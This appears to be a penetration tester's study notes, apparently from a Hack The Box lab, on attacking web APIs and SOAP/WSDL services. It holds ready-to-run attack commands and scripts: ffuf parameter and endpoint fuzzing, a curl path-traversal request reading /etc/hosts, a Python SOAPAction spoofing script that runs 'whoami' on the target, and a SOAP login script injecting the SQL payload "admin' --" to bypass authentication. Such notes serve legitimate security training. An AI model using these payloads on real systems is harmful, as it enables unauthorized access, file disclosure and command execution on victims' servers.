# API Attacks
## Testing for API functionality
1. Perform ffuf attack as follows:
```shell
ffuf -w "/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
```
- If you find a valid parameter (ex: `id`), continue
2. Send requests with the found valid parameter to check responses:
```shell
curl http://<TARGET IP>:3003/?id=1
```
- If this works, create script and run to retrieve all information: [[1. Information Disclosure#Information Disclosure through Fuzzing]]
3. If this doesn't work, test for SQLi through same `id` paramater: [[1. Information Disclosure#Information Disclosure through SQL Injection]]


### Fuzz for API endpoints:
```shell
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```



### Check for LFI attack
```shell
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```



## Testing for SSRF: [[5. Server-Side Request Forgery (SSRF)#Example Scenario]]


# WSDL File Found
## Finding Vulnerable Functions
### If WSDL file runs commands
1. Look through the WSDL file for:
	- `<wsdl:operation name="...">`
	- `<soap:operation soapAction="..." />` 
		- Look through the elements under this section and:
		- Look for risky functions in here (`exec`, `run`, `cmd`, `upload`, `admin`, `debug`, etc.)
2. If found interesting sections, we can build a script to make our own requests:
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- Change the following based on your wsdl file:
	- `xmlns:tns=...` 
	- `ExecuteCommandRequest xmnls=...` 
	- `http://<TARGET IP>:3002/wsdl` - change to victims endpoint for their wsdl file
	- `"SOAPAction":'"ExecuteCommand"`

3. Execute script to run the `whoami` command:
```shell
python3 client_soapaction_spoofing.py
```




### If we find a SOAPAction parameter that sends username/password
1. Find a SOAPAction with username and password elements:
```xml
      <s:element name="LoginRequest">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
```
2. Specify element name (`LoginRequest`) within `<soap:Body>`
3. Provide a SQLi that will allow us to login as a valid user (ex: `admin` -> `admin' --`) for the `<username>`
4. Provide any dummy password value for `<password>`
5. Then use following script to trigger the vulnerability:
```python
import requests

payload = "admin' --"
data = f'<?xml version="1.0" encoding="UTF-8"?> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:tns="http://tempuri.org/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <soap:Body> <LoginRequest xmlns="http://tempuri.org/"> <username>{payload}</username> <password>fff</password> </LoginRequest> </soap:Body> </soap:Envelope>'

print(requests.post("http://IP-ADDRESS:PORT/wsdl", data=data, headers={"SOAPAction":'"Login"'}).content)
```
- Change based on circumstances:
	- `admin' --` - Change with valid username
	- `xmlns:tns=...`
	- `<LoginRequest...` & `</LoginRequest>`
	- `<username>` - If it is called something different (ex: `user`, `usernamelogin`, etc.)
		- Same with `<password>`
	- `http://<TARGET IP>:3002/wsdl` - change to victims endpoint for their wsdl file

We can then run it with:
```shell
python3 sqli.py
```
